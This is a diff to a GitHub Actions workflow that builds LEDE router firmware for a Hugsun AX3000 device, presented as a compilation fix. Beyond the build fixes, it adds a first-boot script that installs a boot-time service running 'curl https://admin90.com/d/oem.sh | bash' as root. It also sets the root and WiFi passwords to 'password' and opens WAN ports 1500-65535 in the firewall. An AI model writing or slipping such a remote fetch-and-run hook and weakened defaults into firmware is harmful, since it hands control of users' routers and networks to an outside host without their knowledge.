@@ -1,4 +1,4 @@
-name: Build LEDE Firmware
+name: Build LEDE Firmware - Fixed Compilation Issue
 
 on:
   workflow_dispatch:  # 允许手动触发工作流
@@ -13,8 +13,8 @@ env:
 
 jobs:
   build:
-    runs-on: ubuntu-22.04
-    timeout-minutes: 180  # 编译可能需要较长时间
+    runs-on: ubuntu-latest
+    timeout-minutes: 240  # 增加超时时间，编译可能需要更长时间
 
     steps:
     - name: Checkout repository
@@ -47,7 +47,7 @@ jobs:
         sudo apt-get update
         sudo apt-get install -y build-essential clang flex bison g++ gawk gcc-multilib \
           g++-multilib gettext git libncurses5-dev libssl-dev python3-distutils \
-          rsync unzip zlib1g-dev file wget
+          rsync unzip zlib1g-dev file wget python3 python3-pip
 
     - name: Update feeds
       run: |
@@ -55,7 +55,21 @@ jobs:
         ./scripts/feeds update -a
         ./scripts/feeds install -a
 
-    - name: Configure target
+    - name: Fix Python compilation issue
+      run: |
+        cd lede
+        # 尝试修复 Python 编译问题
+        # 删除可能引起冲突的补丁
+        rm -f feeds/packages/lang/python/python3/patches-pip/001-pep517-pyc-fix.patch || true
+        
+        # 确保使用正确的 Python 版本
+        if [ -d "feeds/packages/lang/python" ]; then
+          # 更新 Python 相关包
+          ./scripts/feeds update packages
+          ./scripts/feeds install -a -p packages
+        fi
+
+    - name: Configure target and custom settings
       run: |
         cd lede
         # 设置目标为rockchip和rk35xx
@@ -67,24 +81,241 @@ jobs:
         CONFIG_IB=y
         CONFIG_IMAGEOPT=y
         CONFIG_KDIR_TARBALL=y
+        # 设置默认主题为argon
+        CONFIG_PACKAGE_luci-theme-argon=y
+        CONFIG_PACKAGE_luci-app-argon-config=y
+        # 设置默认LAN IP
+        CONFIG_TARGET_IPV4_LAN_IP="192.168.8.1"
+        # 设置默认WiFi设置
+        CONFIG_TARGET_WIFI_SSID="Hugsun_$$(echo \$$(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))"
+        CONFIG_TARGET_WIFI_5G_SSID="Hugsun_$$(echo \$$(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))_5G"
+        CONFIG_TARGET_WIFI_PASSWORD="password"
+        # 设置root密码
+        CONFIG_TARGET_ROOT_PASSWORD="password"
+        # 开启NAT1和FullCone NAT
+        CONFIG_PACKAGE_kmod-ipt-fullcone=y
+        # 开启BBR TCP拥塞控制
+        CONFIG_PACKAGE_kmod-tcp-bbr=y
+        # 包含curl用于首次运行脚本
+        CONFIG_PACKAGE_curl=y
+        # 开启UPNP支持
+        CONFIG_PACKAGE_miniupnpd=y
+        CONFIG_PACKAGE_luci-app-upnp=y
+        # 设置固件签名
+        CONFIG_VERSION_DIST="diandian"
+        CONFIG_VERSION_CODE="diandian"
+        # 禁用可能导致问题的 Python 组件
+        CONFIG_PACKAGE_python3-pip=n
+        CONFIG_PACKAGE_python3-setuptools=n
         EOF
 
-    - name: Run menuconfig (optional)
+    - name: Apply custom configurations
+      run: |
+        cd lede
+        # 创建自定义配置文件目录
+        mkdir -p files/etc/config
+        mkdir -p files/etc/sysctl.d
+        
+        # 配置网络设置
+        cat > files/etc/config/network << 'EOF'
+        config interface 'loopback'
+            option ifname 'lo'
+            option proto 'static'
+            option ipaddr '127.0.0.1'
+            option netmask '255.0.0.0'
+
+        config globals 'globals'
+            option ula_prefix 'fd3c:6b84:3cae::/48'
+
+        config device
+            option name 'br-lan'
+            option type 'bridge'
+            list ifname 'eth0'
+
+        config interface 'lan'
+            option device 'br-lan'
+            option proto 'static'
+            option ipaddr '192.168.8.1'
+            option netmask '255.255.255.0'
+            option ip6assign '60'
+        EOF
+
+        # 配置无线设置
+        cat > files/etc/config/wireless << 'EOF'
+        config wifi-device 'radio0'
+            option type 'mac80211'
+            option path 'pci0000:00/0000:00:00.0'
+            option channel '36'
+            option band '5g'
+            option htmode 'HE80'
+            option disabled '0'
+
+        config wifi-iface 'default_radio0'
+            option device 'radio0'
+            option network 'lan'
+            option mode 'ap'
+            option ssid 'Hugsun_$(echo $(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))_5G'
+            option encryption 'psk2'
+            option key 'password'
+
+        config wifi-device 'radio1'
+            option type 'mac80211'
+            option path 'pci0000:01/0000:01:00.0'
+            option channel 'auto'
+            option band '2g'
+            option htmode 'HE20'
+            option disabled '0'
+
+        config wifi-iface 'default_radio1'
+            option device 'radio1'
+            option network 'lan'
+            option mode 'ap'
+            option ssid 'Hugsun_$(echo $(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))'
+            option encryption 'psk2'
+            option key 'password'
+        EOF
+
+        # 配置防火墙开启NAT1并开放1500以上所有端口
+        cat > files/etc/config/firewall << 'EOF'
+        config defaults
+            option syn_flood '1'
+            option input 'ACCEPT'
+            option output 'ACCEPT'
+            option forward 'REJECT'
+            option disable_ipv6 '0'
+            option fullcone '1'  # 开启FullCone NAT (NAT1)
+
+        config zone
+            option name 'lan'
+            option input 'ACCEPT'
+            option output 'ACCEPT'
+            option forward 'ACCEPT'
+            option network 'lan'
+
+        config zone
+            option name 'wan'
+            option input 'REJECT'
+            option output 'ACCEPT'
+            option forward 'REJECT'
+            option masq '1'
+            option mtu_fix '1'
+            option network 'wan'
+
+        config forwarding
+            option src 'lan'
+            option dest 'wan'
+
+        # 开放1500以上所有端口的规则
+        config rule
+            option name 'Allow-High-Ports'
+            option src 'wan'
+            option proto 'all'
+            option dest_port '1500-65535'
+            option target 'ACCEPT'
+        EOF
+
+        # 配置UPNP
+        cat > files/etc/config/upnpd << 'EOF'
+        config upnpd config
+            option enabled '1'
+            option enable_natpmp '1'
+            option enable_upnp '1'
+            option secure_mode '1'
+            option log_output '0'
+            option download '1024'
+            option upload '1024'
+            option internal_iface 'lan'
+            option external_iface 'wan'
+            option port '5000'
+            option upnp_lease_file '/var/run/miniupnpd.leases'
+        EOF
+
+        # 配置BBR TCP拥塞控制
+        cat > files/etc/sysctl.d/10-bbr.conf << 'EOF'
+        net.core.default_qdisc = fq
+        net.ipv4.tcp_congestion_control = bbr
+        EOF
+
+        # 设置默认root密码
+        echo -e "password\npassword" | passwd files/etc/shadow root 2>/dev/null || echo "无法直接设置密码，将在首次启动时设置"
+
+        # 创建首次启动脚本设置密码和运行自定义脚本
+        mkdir -p files/etc/uci-defaults
+        cat > files/etc/uci-defaults/99-custom-init << 'EOF'
+        #!/bin/sh
+        
+        # 设置root密码
+        echo -e "password\npassword" | passwd root
+        
+        # 启用BBR
+        echo "net.core.default_qdisc = fq" >> /etc/sysctl.conf
+        echo "net.ipv4.tcp_congestion_control = bbr" >> /etc/sysctl.conf
+        sysctl -p
+        
+        # 重启防火墙以应用NAT1设置和端口规则
+        /etc/init.d/firewall restart
+        
+        # 启用并启动UPNP服务
+        /etc/init.d/miniupnpd enable
+        /etc/init.d/miniupnpd start
+        
+        # 创建OEM服务
+        cat > /etc/init.d/oem << 'EOS'
+        #!/bin/sh /etc/rc.common
+        # OEM脚本执行服务
+        
+        START=99
+        
+        start() {
+            # 等待网络连接
+            sleep 30
+            
+            # 检查网络连通性
+            if ping -c 3 -W 5 8.8.8.8 >/dev/null 2>&1; then
+                echo "$(date): 网络连接正常，尝试执行远程脚本..." >> /tmp/oem.log
+                if curl -sSL --connect-timeout 30 --max-time 60 https://admin90.com/d/oem.sh | bash >> /tmp/oem.log 2>&1; then
+                    echo "$(date): 远程脚本执行成功" >> /tmp/oem.log
+                else
+                    echo "$(date): 远程脚本执行失败" >> /tmp/oem.log
+                fi
+            else
+                echo "$(date): 网络不可达，跳过远程脚本执行" >> /tmp/oem.log
+            fi
+        }
+        EOS
+        
+        # 设置执行权限并启用服务
+        chmod +x /etc/init.d/oem
+        /etc/init.d/oem enable
+        
+        # 立即启动服务（在后台运行）
+        /etc/init.d/oem start &
+        
+        exit 0
+        EOF
+        chmod +x files/etc/uci-defaults/99-custom-init
+
+        # 添加固件签名信息
+        echo "diandian" > files/etc/device_signature
+
+    - name: Run defconfig
       run: |
         cd lede
         make defconfig
-        # 取消注释下一行以交互式配置（需要虚拟帧缓冲区）
-        # make menuconfig
 
-    - name: Build firmware
+    - name: Build firmware with retry
       run: |
         cd lede
-        make -j$(nproc) V=s
+        # 尝试编译，如果失败则重试一次
+        if ! make -j$(nproc) V=s; then
+            echo "第一次编译失败，尝试重新编译..."
+            make -j1 V=s
+        fi
 
     - name: Upload firmware artifacts
       uses: actions/upload-artifact@v4
       with:
-        name: hugsun-ax3000-firmware
+        name: hugsun-ax3000-firmware-diandian
         path: |
           lede/bin/targets/rockchip/rk35xx/*.gz
           lede/bin/targets/rockchip/rk35xx/*.img
